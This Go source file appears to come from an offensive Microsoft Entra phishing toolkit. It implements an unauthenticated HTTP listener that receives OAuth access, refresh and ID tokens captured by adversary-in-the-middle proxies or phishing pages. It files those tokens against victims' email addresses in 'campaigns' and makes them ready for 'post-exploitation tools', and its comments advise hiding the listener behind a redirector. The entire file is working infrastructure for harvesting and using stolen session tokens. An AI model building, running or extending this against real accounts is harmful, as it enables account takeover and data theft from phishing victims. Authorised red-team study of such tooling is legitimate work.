package api

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/bl4cksku11/entraith/internal/campaigns"
)

// TokenListener is a standalone HTTP server — separate from the operator console
// and from the generic webhook listener — that receives OAuth tokens pushed in
// from an external source (an AiTM / reverse proxy, a phishing landing page, or a
// manual curl drop) and ingests them into a campaign. Ingested tokens appear in
// the console and are immediately usable by every post-exploitation tool.
//
// The intake endpoint is intentionally unauthenticated on the wire — the whole
// point is that an external component POSTs to it — so bind it to a port/interface
// only the operator infrastructure can reach, or front it with a redirector. The
// start/stop/status controls live behind the authenticated /api/ router.
type TokenListener struct {
	mu        sync.Mutex
	server    *http.Server
	port      int
	running   bool
	startedAt time.Time
	received  int
	ingested  int

	logPath         string
	mgr             *campaigns.Manager
	defaultCampaign string

	// DefaultPort is the configured fallback port used when a start request
	// does not specify one (config key listener.token_port; 8000 if unset).
	DefaultPort int
}

// NewTokenListener builds a stopped listener. Call Start(port) to bind it.
func NewTokenListener(mgr *campaigns.Manager, logPath, defaultCampaign string) *TokenListener {
	return &TokenListener{
		mgr:             mgr,
		logPath:         logPath,
		defaultCampaign: defaultCampaign,
		DefaultPort:     8000,
	}
}

// TokenListenerStatus is the JSON status returned by the control endpoints.
type TokenListenerStatus struct {
	Running         bool   `json:"running"`
	Port            int    `json:"port"`
	StartedAt       string `json:"started_at,omitempty"`
	Received        int    `json:"received"`
	Ingested        int    `json:"ingested"`
	LogPath         string `json:"log_path"`
	DefaultCampaign string `json:"default_campaign,omitempty"`
	DefaultPort     int    `json:"default_port"`
}

// tokenIntake is the accepted intake payload. Field names cover the common shapes
// emitted by AiTM proxies (evilginx-style JSON) and hand-written drops.
type tokenIntake struct {
	AccessToken  string `json:"access_token"`
	RefreshToken string `json:"refresh_token"`
	IDToken      string `json:"id_token"`
	TokenType    string `json:"token_type"`
	ExpiresIn    int    `json:"expires_in"`
	Scope        string `json:"scope"`
	CampaignID   string `json:"campaign_id"`
	TargetID     string `json:"target_id"`
	TargetEmail  string `json:"target_email"`
	Source       string `json:"source"`
}

func (tl *TokenListener) SetDefaultCampaign(id string) {
	tl.mu.Lock()
	tl.defaultCampaign = id
	tl.mu.Unlock()
}

// Start binds the listener on the given port and serves the intake endpoints.
func (tl *TokenListener) Start(port int) error {
	tl.mu.Lock()
	defer tl.mu.Unlock()
	if tl.running {
		return fmt.Errorf("token listener already running on port %d", tl.port)
	}
	if port <= 0 || port > 65535 {
		return fmt.Errorf("invalid port %d", port)
	}

	mux := http.NewServeMux()
	mux.HandleFunc("/token", tl.handleIntake)
	mux.HandleFunc("/", tl.handleIntake)
	mux.HandleFunc("/health", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		w.Write([]byte(`{"status":"ok"}`))
	})

	// Bind first so a port clash returns an immediate error instead of failing
	// silently inside the serving goroutine.
	ln, err := net.Listen("tcp", fmt.Sprintf(":%d", port))
	if err != nil {
		return fmt.Errorf("port %d unavailable: %w", port, err)
	}

	srv := &http.Server{Handler: mux, ReadHeaderTimeout: 15 * time.Second}
	tl.server = srv
	tl.port = port
	tl.running = true
	tl.startedAt = time.Now().UTC()

	go func() {
		if err := srv.Serve(ln); err != nil && err != http.ErrServerClosed {
			tl.mu.Lock()
			tl.running = false
			tl.mu.Unlock()
			log.Printf("[token-listener] serve error: %v", err)
		}
	}()

	log.Printf("[token-listener] listening on :%d — POST /token → ingest into campaign token store", port)
	return nil
}

// Stop gracefully shuts the listener down.
func (tl *TokenListener) Stop() error {
	tl.mu.Lock()
	defer tl.mu.Unlock()
	if !tl.running {
		return fmt.Errorf("token listener is not running")
	}
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	err := tl.server.Shutdown(ctx)
	tl.running = false
	tl.server = nil
	return err
}

// Status returns a snapshot of the listener state.
func (tl *TokenListener) Status() TokenListenerStatus {
	tl.mu.Lock()
	defer tl.mu.Unlock()
	st := TokenListenerStatus{
		Running:         tl.running,
		Port:            tl.port,
		Received:        tl.received,
		Ingested:        tl.ingested,
		LogPath:         tl.logPath,
		DefaultCampaign: tl.defaultCampaign,
		DefaultPort:     tl.DefaultPort,
	}
	if tl.running {
		st.StartedAt = tl.startedAt.Format(time.RFC3339)
	}
	return st
}

// GetLogs returns the last n audit entries from the listener log.
func (tl *TokenListener) GetLogs(n int) []WebhookEntry {
	return readLogTail(tl.logPath, n)
}

// handleIntake parses one incoming token, ingests it, and writes a redacted
// audit entry. It is the only public surface of the standalone listener.
func (tl *TokenListener) handleIntake(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		w.WriteHeader(http.StatusMethodNotAllowed)
		return
	}

	tl.mu.Lock()
	tl.received++
	defCampaign := tl.defaultCampaign
	tl.mu.Unlock()

	intake, err := parseTokenIntake(r)
	if err != nil {
		tl.audit(r, tokenIntake{}, "", "", "parse_error:"+err.Error())
		writeJSON(w, 400, map[string]string{"error": err.Error()})
		return
	}

	campaignID := intake.CampaignID
	if campaignID == "" {
		campaignID = defCampaign
	}
	if campaignID == "" {
		tl.audit(r, intake, "", "", "no_campaign")
		writeJSON(w, 400, map[string]string{"error": "campaign_id required (no default campaign configured)"})
		return
	}

	res, err := tl.mgr.IngestCapturedToken(campaignID, campaigns.CapturedToken{
		AccessToken:  intake.AccessToken,
		RefreshToken: intake.RefreshToken,
		IDToken:      intake.IDToken,
		TokenType:    intake.TokenType,
		ExpiresIn:    intake.ExpiresIn,
		Scope:        intake.Scope,
		TargetID:     intake.TargetID,
		TargetEmail:  intake.TargetEmail,
		Source:       pickNonEmpty(intake.Source, "token-listener"),
	})
	if err != nil {
		tl.audit(r, intake, campaignID, "", "ingest_error:"+err.Error())
		writeJSON(w, 422, map[string]string{"error": err.Error()})
		return
	}

	tl.mu.Lock()
	tl.ingested++
	tl.mu.Unlock()
	tl.audit(r, intake, campaignID, res.TargetEmail, "ingested")

	writeJSON(w, 200, map[string]string{
		"status":       "ingested",
		"campaign_id":  campaignID,
		"target_id":    res.TargetID,
		"target_email": res.TargetEmail,
		"upn":          res.UserPrincipalName,
	})
}

// parseTokenIntake reads the token payload as JSON (default) or form-urlencoded,
// selected by Content-Type. Bodies are capped at 1 MiB.
func parseTokenIntake(r *http.Request) (tokenIntake, error) {
	var in tokenIntake
	ct := r.Header.Get("Content-Type")
	if strings.Contains(ct, "application/x-www-form-urlencoded") {
		r.Body = io.NopCloser(io.LimitReader(r.Body, 1<<20))
		if err := r.ParseForm(); err != nil {
			return in, fmt.Errorf("invalid form body")
		}
		in.AccessToken = r.PostForm.Get("access_token")
		in.RefreshToken = r.PostForm.Get("refresh_token")
		in.IDToken = pickNonEmpty(r.PostForm.Get("id_token"), r.PostForm.Get("idtoken"))
		in.TokenType = r.PostForm.Get("token_type")
		in.Scope = r.PostForm.Get("scope")
		if v := r.PostForm.Get("expires_in"); v != "" {
			in.ExpiresIn, _ = strconv.Atoi(v)
		}
		in.CampaignID = r.PostForm.Get("campaign_id")
		in.TargetID = r.PostForm.Get("target_id")
		in.TargetEmail = r.PostForm.Get("target_email")
		in.Source = r.PostForm.Get("source")
	} else {
		body, _ := io.ReadAll(io.LimitReader(r.Body, 1<<20))
		if len(body) == 0 {
			return in, fmt.Errorf("empty body")
		}
		if err := json.Unmarshal(body, &in); err != nil {
			return in, fmt.Errorf("invalid JSON body")
		}
	}
	if in.AccessToken == "" && in.RefreshToken == "" && in.IDToken == "" {
		return in, fmt.Errorf("at least one of access_token, refresh_token, id_token required")
	}
	return in, nil
}

// audit writes a REDACTED entry to the listener log. Full token material is never
// written to the plaintext log — it lives encrypted-at-rest in the store. The log
// records provenance (source IP, outcome, which token types were present, and a
// short non-sensitive prefix) so an operator can trace intake without leaking
// usable secrets.
func (tl *TokenListener) audit(r *http.Request, in tokenIntake, campaignID, targetEmail, outcome string) {
	entry := map[string]interface{}{
		"campaign_id":   campaignID,
		"target_email":  targetEmail,
		"outcome":       outcome,
		"has_access":    in.AccessToken != "",
		"has_refresh":   in.RefreshToken != "",
		"has_id":        in.IDToken != "",
		"access_token":  redactToken(in.AccessToken),
		"refresh_token": redactToken(in.RefreshToken),
		"id_token":      redactToken(in.IDToken),
		"scope":         in.Scope,
		"source":        in.Source,
	}
	b, _ := json.Marshal(entry)
	writeWebhookLogEntryWithType(tl.logPath, r.RemoteAddr, r.Method, r.URL.Path, "json", b, "token_ingest")
}

// redactToken returns a short, non-usable fingerprint of a token: a prefix plus
// its length. Empty input yields "".
func redactToken(s string) string {
	if s == "" {
		return ""
	}
	prefix := s
	if len(prefix) > 12 {
		prefix = prefix[:12]
	}
	return fmt.Sprintf("%s…(len=%d)", prefix, len(s))
}

// pickNonEmpty returns the first non-empty string.
func pickNonEmpty(vals ...string) string {
	for _, v := range vals {
		if v != "" {
			return v
		}
	}
	return ""
}
